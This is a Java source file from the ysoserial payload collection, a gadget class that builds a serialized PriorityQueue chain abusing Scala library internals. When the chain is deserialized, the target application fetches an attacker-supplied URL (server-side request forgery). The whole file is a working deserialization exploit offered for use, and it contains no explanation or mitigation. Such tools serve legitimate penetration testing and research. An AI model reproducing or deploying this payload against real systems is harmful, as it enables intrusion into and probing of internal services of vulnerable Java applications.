package ysoserial.payloads;

import scala.Function0;
import scala.Function1;
import scala.PartialFunction;
import scala.math.Ordering$;
import scala.sys.process.processInternal$;
import ysoserial.payloads.annotation.Authors;
import ysoserial.payloads.annotation.Dependencies;
import ysoserial.payloads.util.PayloadRunner;
import ysoserial.payloads.util.Reflections;

import java.net.URL;
import java.util.Comparator;
import java.util.PriorityQueue;

@Dependencies({"org.scala-lang:scala-library:2.12.6"})
@Authors({ Authors.JACKOFMOSTTRADES })
public class Ssrf extends PayloadRunner implements ObjectPayload<PriorityQueue<Throwable>> {

    private static PriorityQueue<Throwable> createExploit(Function0<Object> exploitFunction) throws Exception {
        PartialFunction<Throwable, Object> onf = processInternal$.MODULE$.onInterrupt(exploitFunction);

        Function1<Throwable, Object> f = new PartialFunction.OrElse(onf, onf);

        // create queue with numbers and basic comparator
        final PriorityQueue<Throwable> queue = new PriorityQueue<Throwable>(2, new Comparator<Throwable>() {
            @Override
            public int compare(Throwable o1, Throwable o2) {
                return 0;
            }
        });

        // stub data for replacement later
        queue.add(new Exception());
        queue.add(new Exception());
        Reflections.setFieldValue(queue, "comparator", Ordering$.MODULE$.<Throwable, Object>by(f, null));

        // switch contents of queue
        final Object[] queueArray = (Object[]) Reflections.getFieldValue(queue, "queue");
        queueArray[0] = new InterruptedException();
        queueArray[1] = new InterruptedException();

        return queue;
    }


    public PriorityQueue<Throwable> getObject(final String url) throws Exception {
        Class<?> clazz = Class.forName("scala.sys.process.ProcessBuilderImpl$URLInput$$anonfun$$lessinit$greater$1");
        Function0<Object> pbf = (Function0<Object>)Reflections.createWithoutConstructor(clazz);
        Reflections.setFieldValue(pbf, "url$1", new URL(url));

        return createExploit(pbf);
    }

    public static void main(final String[] args) throws Exception {
        PayloadRunner.run(Ssrf.class, new String[]{"http://localhost:7001/foo"});
    }
}
